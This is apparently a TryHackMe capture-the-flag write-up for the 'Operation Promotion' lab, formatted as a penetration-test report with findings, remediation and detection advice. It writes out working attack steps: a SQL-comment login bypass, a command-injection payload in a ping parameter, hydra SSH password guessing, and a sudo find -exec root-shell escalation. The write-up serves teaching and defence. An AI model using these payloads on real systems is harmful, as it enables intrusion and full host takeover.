---
title: "TryHackMe: Operation Promotion"
date: 2026-06-14 23:50:00 +0200
categories: [TryHackMe]
tags:
  - linux
  - web
  - sql-injection
  - command-injection
  - ssh
  - password-attacks
  - sudo
  - find
  - privilege-escalation
description: >-
  Operation Promotion chains a SQL injection authentication bypass, command
  injection, predictable SSH credentials, and an unsafe NOPASSWD find rule
  into complete root compromise.
author: lenovolegion7
media_subpath: /images/tryhackme_operation_promotion
image:
  path: room_image.webp
  alt: "Original TryHackMe Operation Promotion room artwork"
toc: true
comments: false
---

Operation Promotion is a Linux web challenge built around unsafe SQL construction, command injection, predictable credentials, and permissive sudo configuration. The validated path began with an unauthenticated login bypass in the RecruitCorp careers portal and ended with a root shell through `sudo find`.

> Passwords, hashes, target addresses, and TryHackMe flags are redacted.
{: .prompt-warning }

[![TryHackMe Operation Promotion room card](room_card.webp){: w="296" h="272" .shadow }](https://tryhackme.com/room/operationpromotion){: .center }

## Executive Summary

The target exposed SSH, Apache HTTP, and Samba/SMB:

```text
22/tcp   SSH
80/tcp   HTTP
139/tcp  NetBIOS/SMB
445/tcp  SMB
```

The validated compromise path was:

1. enumerate exposed services and identify the RecruitCorp careers portal;
2. discover `/admin/` through `robots.txt`;
3. bypass the admin login with SQL injection;
4. enumerate the authenticated dashboard and identify a hidden maintenance ping endpoint;
5. exploit command injection to execute commands as `www-data`;
6. enumerate local application files and identify the `jford` account plus a bcrypt credential hash;
7. use the public "Spring 2026 Hiring Drive" clue to generate a focused candidate list;
8. recover the valid SSH credential for `jford`;
9. obtain an SSH shell as `jford`;
10. identify passwordless sudo access to `/usr/bin/find`;
11. abuse `find -exec` to obtain a root shell;
12. retrieve the final root-only objective.

> **Result:** Unauthenticated web access was converted into full root compromise through SQL injection, command injection, predictable credentials, and an unsafe sudo rule.
{: .prompt-danger }

## Scope and Safety Context

This assessment was performed only against the authorized TryHackMe laboratory target.

Testing was limited to proving compromise and retrieving the room objectives. Persistence, destructive actions, unnecessary data exfiltration, and lateral movement outside the supplied lab were not performed.

## Initial Enumeration

Service discovery identified four externally reachable services:

```console
$ nmap \
  -p22,80,139,445 \
  -sV -sC -T4 -Pn \
  TARGET_IP
```

Observed services:

```text
22/tcp   SSH       OpenSSH 9.6p1 Ubuntu
80/tcp   HTTP      Apache 2.4.58
139/tcp  NetBIOS   Samba
445/tcp  SMB       Samba
```

The HTTP service hosted the RecruitCorp Careers Portal.

## SMB Enumeration

SMB accepted anonymous or guest sessions and exposed a readable `public` share:

```console
$ smbclient -L //TARGET_IP -N
```

Observed shares:

```text
public
IPC$
```

The public share contained only a low-impact README and did not directly expose credentials, but it confirmed unnecessary anonymous service exposure.

## Admin Portal SQL Injection

`robots.txt` disclosed:

```text
/admin/
```

The admin route presented a username/password form. A SQL comment payload in the username field bypassed authentication and returned an authenticated dashboard session:

```console
$ curl -s -i \
  -c web/cookies-sqli.txt \
  -b web/cookies-sqli.txt \
  -X POST \
  http://operation-promotion.thm/admin/ \
  --data-urlencode "username=admin' -- " \
  --data-urlencode "password=x"
```

Relevant response:

```text
HTTP/1.1 302 Found
Location: /admin/dashboard.php
```

The vulnerable login flow constructed SQL directly from attacker-controlled input instead of using prepared statements.

## Maintenance Endpoint Discovery

Authenticated dashboard enumeration exposed a service account named:

```text
sysmaint
```

Its notes referenced:

```text
/admin/sysmaint-checks/ping.php
```

The endpoint accepted a `host` parameter and returned ping output.

## Command Injection

The `host` value was passed into shell execution without safe validation.

A controlled `id` payload confirmed execution as:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Representative validation:

```console
$ curl -s -G -L \
  -b web/cookies-sqli.txt \
  --data-urlencode 'host=LOOPBACK_IP;id' \
  http://operation-promotion.thm/admin/sysmaint-checks/ping.php
```

The same condition provided a reverse shell as `www-data`. All addressing is represented with placeholders:

```text
TARGET_IP
ATTACKER_IP
LOOPBACK_IP
```

## Local Enumeration and Credential Clue

Local enumeration as `www-data` exposed:

```text
/var/www/html/config/db.conf
/var/lib/recruitcorp/app.db
```

The configuration identified:

```text
db_user=jford
db_pass_hash=[REDACTED]
```

The bcrypt hash is intentionally not published.

The public careers page contained the clue:

```text
Spring 2026 Hiring Drive
```

A focused candidate list was generated from:

```text
spring2026
```

using Hashcat's `dive.rule`:

```console
$ echo "spring2026" > base.txt

$ hashcat \
  --stdout base.txt \
  -r /usr/share/hashcat/rules/dive.rule \
  > wordlist.txt
```

The list was validated against SSH:

```console
$ hydra \
  -l jford \
  -P wordlist.txt \
  operation-promotion.thm \
  ssh
```

A valid password was recovered but is redacted:

```text
jford : [REDACTED]
```

## SSH Foothold as jford

The recovered credential authenticated successfully:

```console
$ ssh jford@operation-promotion.thm
```

The user objective was located at:

```text
/home/jford/user.txt
```

Its value is redacted:

```text
THM{[REDACTED]}
```

## Privilege Escalation Through sudo find

Sudo enumeration showed:

```text
(root) NOPASSWD: /usr/bin/find
```

Because `find` supports command execution through `-exec`, the rule allowed a root shell:

```console
$ sudo /usr/bin/find . -exec /bin/sh \; -quit
```

The resulting identity was:

```text
uid=0(root) gid=0(root) groups=0(root)
```

The final objective was:

```text
/root/flag.txt
```

with its value redacted:

```text
THM{[REDACTED]}
```

## Findings

### F-01 - SQL Injection Authentication Bypass

- **Severity:** Critical
- **Affected asset:** `/admin/index.php`
- **Impact:** unauthenticated admin dashboard access

The login flow directly incorporated user-controlled values into SQL, permitting a comment-based authentication bypass.

**Remediation:**

- use prepared statements and bound parameters;
- use modern password-hashing APIs;
- add rate limiting, alerting, and MFA for administrative access.

### F-02 - Command Injection in Maintenance Ping Check

- **Severity:** Critical
- **Affected asset:** `/admin/sysmaint-checks/ping.php`
- **Impact:** remote command execution as `www-data`

The maintenance endpoint passed the `host` parameter into shell execution without adequate validation.

**Remediation:**

- avoid shell execution where possible;
- use a safe networking library or tightly constrained wrapper;
- apply strict hostname/IP allowlisting;
- restrict maintenance functionality by role and network location.

### F-03 - Predictable SSH Password Derived from Public Content

- **Severity:** High
- **Affected account:** `jford`
- **Impact:** authenticated SSH shell

A seasonal password pattern was derived from public website content using a focused mutation rule.

**Remediation:**

- require unique high-entropy passwords;
- disable SSH password authentication where practical;
- use keys or MFA;
- deploy rate limiting and failed-login alerting;
- prohibit company-, season-, event-, or year-derived passwords.

### F-04 - Passwordless sudo Rule Allows Root Shell Through find

- **Severity:** Critical
- **Affected account:** `jford`
- **Sudo rule:** `(root) NOPASSWD: /usr/bin/find`
- **Impact:** immediate root shell

`find -exec` made the sudo rule equivalent to arbitrary root command execution.

**Remediation:**

- remove the sudo rule for `find`;
- avoid sudo delegation to general-purpose command-execution utilities;
- use constrained root-owned wrappers for specific tasks;
- audit sudoers for shell escapes.

### F-05 - Sensitive Configuration and Database Accessible to Web Process

- **Severity:** High
- **Affected paths:** `/var/www/html/config/db.conf`, `/var/lib/recruitcorp/app.db`
- **Impact:** credential and identity exposure supporting lateral movement

The web process could read sensitive configuration and application database material.

**Remediation:**

- move secrets outside the web root;
- restrict files to the minimum required account;
- eliminate plaintext application passwords;
- separate application and OS identities;
- tighten filesystem permissions.

### F-06 - Information Disclosure Through robots.txt, Directory Listing, and Public SMB

- **Severity:** Low
- **Affected services:** HTTP and SMB
- **Impact:** reduced attacker effort and hidden-path disclosure

`robots.txt`, directory indexing, and anonymous SMB exposure revealed internal structure.

**Remediation:**

- never use `robots.txt` as access control;
- disable unnecessary directory indexing;
- remove anonymous SMB access;
- review exposed shares and web paths regularly.

## Security Impact

The validated chain provided complete control of the Linux host from an unauthenticated external position.

An attacker with equivalent access could:

- bypass administrative authentication;
- execute OS commands as the web account;
- inspect sensitive application files;
- derive a valid SSH credential from public information;
- obtain a local user shell;
- escalate directly to root through unsafe sudo delegation;
- access all data and controls available to root.

## Detection Opportunities

Useful monitoring controls include:

- alert on SQL-comment patterns in admin login requests;
- detect unusual successful transitions into `/admin/dashboard.php`;
- detect shell metacharacters in maintenance endpoint parameters;
- alert on child shells or outbound callbacks from Apache;
- monitor sensitive-file access by `www-data`;
- alert on SSH password guessing for known local users;
- detect sudo execution of `find`;
- specifically alert on `find -exec` under sudo;
- monitor anonymous SMB access and directory enumeration.

## Remediation Priorities

1. Patch SQL injection in `/admin/index.php`.
2. Remove or redesign the command-injection-prone ping endpoint.
3. Rotate the `jford` credential and related secrets.
4. Remove root `NOPASSWD` access to `/usr/bin/find`.
5. Move secrets outside the web root.
6. Restrict `www-data` to only required files.
7. Replace plaintext application passwords with secure hashes.
8. Disable SSH password authentication or enforce MFA.
9. Disable unnecessary directory indexing and anonymous SMB access.
10. Add CI tests for SQL injection and command injection.
11. Review sudoers regularly for executable escape paths.

## Retest Plan

1. Confirm SQL-comment payloads no longer bypass `/admin/`.
2. Verify login queries are parameterized.
3. Confirm the ping endpoint cannot execute arbitrary commands.
4. Verify `www-data` cannot read unnecessary secrets.
5. Confirm the previous `jford` credential no longer authenticates.
6. Verify public website clues cannot yield valid SSH credentials.
7. Confirm `sudo -l` no longer grants `/usr/bin/find` as root.
8. Verify `find -exec` cannot produce an elevated shell.
9. Confirm anonymous SMB access is removed if unnecessary.
10. Verify directory indexing no longer exposes hidden structure.
11. Confirm the previous chain no longer results in root access.

## Lessons Learned

Operation Promotion demonstrates how conventional weaknesses can chain into full compromise without a memory-corruption exploit.

SQL injection broke the web authentication boundary. Command injection converted dashboard access into operating-system execution. Predictable credential selection turned public clues into SSH access, and the final sudo rule made a general-purpose command-execution utility available as root.

The strongest defensive response is to treat application input handling, secret storage, credential policy, remote access, and sudo configuration as one connected privilege boundary.
